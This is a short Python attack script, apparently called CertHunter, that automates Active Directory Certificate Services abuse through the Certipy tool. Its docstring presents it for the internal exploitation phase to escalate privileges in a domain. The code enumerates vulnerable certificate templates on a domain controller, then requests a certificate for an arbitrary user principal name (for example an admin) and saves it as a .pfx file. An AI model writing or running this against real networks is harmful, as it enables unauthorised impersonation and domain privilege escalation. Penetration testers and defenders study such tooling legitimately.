"""<WARNING> YOU MUST HAVE https://github.com/ly4k/Certipy <WARNING>

Usage and Help for you!
  [I designed this for post-recon / internal network exploitation phase, when we got some access to the domain but want to escalate more!]
  Automates ADCS (Active Directory Certificate Services) abuse steps by:
   1. Enumerating to find vulnerable certificate templates from a specified domain controller
   2. Requesting a certificate from a chosen template via Certipy

Usage:
  python adcs_autoenum_req.py <domain_controller_ip> <ca_name> <template_name> <upn>

Example command:
  python3 CertHunter.py <IP> EDU-CA AdminAccessTemplate user@domain.local

Output (should be):
  Prints discovered vulnerable templates
  Saves requested certificate as a .pfx in the current working directory
"""


import subprocess
import sys

def find_vulnerable_templates(domain_controller):
    # Here we use certipy(https://github.com/ly4k/Certipy) to find vulnerable templates and output them!
    result = subprocess.run([
        "certipy", "find", "-dc-ip", domain_controller, "-vulnerable", "-stdout"
    ], capture_output=True, text=True, check=False)
    return result.stdout

def request_certificate(ca_name, domain_controller, template, upn):
    # Using certipy to request a certificate from the vulnerable template!
    subprocess.run([
        "certipy", "req", "-ca", ca_name, "-dc-ip", domain_controller,
        "-template", template, "-upn", upn, "-save-pfx"
    ], check=False)

def main():
    # Making sure the user didn't mess up their command  
    if len(sys.argv) != 5:
        print(f"[!CertHunter] Usage: {sys.argv[0]} <domain_controller_ip> <ca_name> <template_name> <upn>")
        print("Example: python3 CertHunter.py <IP> EDU-CA AdminAccessTemplate user@domain.local")
        sys.exit(1)

    # Parsing cli args, enumerating vuln templates, requesting certif. and printing status for each crucial step.
    domain_controller = sys.argv[1]
    ca_name = sys.argv[2]
    template = sys.argv[3]
    upn = sys.argv[4]

    print("[X] Finding vulnerable certificate templates...")
    templates = find_vulnerable_templates(domain_controller)
    print(templates)

    print(f"[X] Asking for the certificate from template {template} for {upn}...")
    request_certificate(ca_name, domain_controller, template, upn)

    print("[X] Certificate request completed! Check the current directory for .pfx file.")

if __name__ == "__main__":
    main()
